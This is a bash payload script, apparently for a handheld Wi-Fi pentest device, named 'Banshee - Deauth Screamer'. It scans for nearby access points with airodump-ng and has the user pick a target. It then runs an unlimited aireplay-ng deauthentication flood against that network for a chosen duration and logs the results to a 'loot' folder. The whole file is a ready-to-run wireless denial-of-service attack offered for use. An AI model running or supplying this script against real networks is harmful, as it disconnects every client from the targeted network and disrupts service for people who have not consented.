#!/bin/bash
# Title: Banshee - Deauth Screamer
# Author: NullSec
# Description: Aggressive deauthentication attack
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/banshee"
mkdir -p "$LOOT_DIR"

PROMPT "BANSHEE - DEAUTH SCREAMER

Aggressive deauthentication
attack on target networks.

Disconnects all clients
from selected AP.

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"; exit 1; }

SPINNER_START "Scanning for targets..."
rm -f /tmp/banshee*
timeout 15 airodump-ng "$MON_IF" -w /tmp/banshee --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

NET_COUNT=0
NETS=""
if [ -f /tmp/banshee-01.csv ]; then
    while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
        essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
        [ -z "$essid" ] && essid="[Hidden]"
        NET_COUNT=$((NET_COUNT + 1))
        NETS="${NETS}${NET_COUNT}. ${essid}\n"
        eval "BSSID_${NET_COUNT}=\"$bssid\""
        eval "CH_${NET_COUNT}=$(echo $channel | tr -d ' ')"
        eval "ESSID_${NET_COUNT}=\"$essid\""
        [ $NET_COUNT -ge 10 ] && break
    done < /tmp/banshee-01.csv
fi

[ $NET_COUNT -eq 0 ] && { ERROR_DIALOG "No networks found!"; exit 1; }

PROMPT "TARGETS: $NET_COUNT

$(echo -e "$NETS")
Select target next."

TARGET_NUM=$(NUMBER_PICKER "Target (1-$NET_COUNT):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

eval "TARGET_BSSID=\"\$BSSID_${TARGET_NUM}\""
eval "TARGET_CH=\"\$CH_${TARGET_NUM}\""
eval "TARGET_ESSID=\"\$ESSID_${TARGET_NUM}\""

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "UNLEASH BANSHEE?

Target: $TARGET_ESSID
BSSID: $TARGET_BSSID
Channel: $TARGET_CH
Duration: ${DURATION}s

Press OK to attack.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Banshee attacking $TARGET_ESSID..."
LOG_FILE="$LOOT_DIR/banshee_$(date +%Y%m%d_%H%M).log"

iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
timeout "$DURATION" aireplay-ng -0 0 -a "$TARGET_BSSID" "$MON_IF" 2>&1 | tee "$LOG_FILE" &
wait $!
killall aireplay-ng 2>/dev/null

rm -f /tmp/banshee* 2>/dev/null

DEAUTH_COUNT=$(grep -c "Sending DeAuth" "$LOG_FILE" 2>/dev/null || echo "N/A")

PROMPT "BANSHEE COMPLETE

Target: $TARGET_ESSID
Deauths sent: ~$DEAUTH_COUNT
Log: $LOG_FILE

Press OK to exit."
